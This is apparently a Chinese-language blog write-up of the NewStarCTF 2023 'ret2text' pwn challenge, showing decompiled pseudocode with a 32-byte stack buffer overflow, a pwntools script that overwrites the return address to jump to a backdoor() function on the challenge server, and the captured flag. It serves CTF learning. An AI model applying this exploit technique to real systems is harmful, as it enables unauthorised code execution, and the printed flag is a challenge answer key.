---
title: NewStarCTF 2023 ret2text
date: 2023-10-24
categories:
  - CTF
  - Pwn
---

## 前置工作

下载附件，用 IDA 64 打开，找到主函数并反汇编，得到如下伪代码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  init(argc, argv, envp);
  puts("Welcome to NewStar CTF!!");
  puts("Show me your magic");
  read(0, buf, 0x100uLL);
  return 0;
}
```

发现 buf 能被接受 0x100 个字节，但长度只有 0x20 字节，会出现栈溢出

## 找 `/bin/sh`

按 Shift + F12 打开字符串查找，找到关键字符串 `/bin/sh`，进入后按 Ctrl + X 找到函数，再按一次 F5 反汇编，找到了关键函数 `int backdoor()`，该函数的地址为 `0x4011FB`

## 编写 Exp

```python
from pwn import *

r = remote("node4.buuoj.cn", 29897)
backdoor_addr = 0x4011FB  # 函数 backdoor() 的地址
payload = b"A"*(0x20+8) + pack(backdoor_addr, 64) # 20 是栈，8 是 dup
r.sendline(payload)
r.interactive()
```

## 攻入靶机

获得权限后，`ls` 和 `cat flag` 一条龙得出最后结果 `flag{efcf1300-9ac4-4a30-84d9-ca717d570428}`
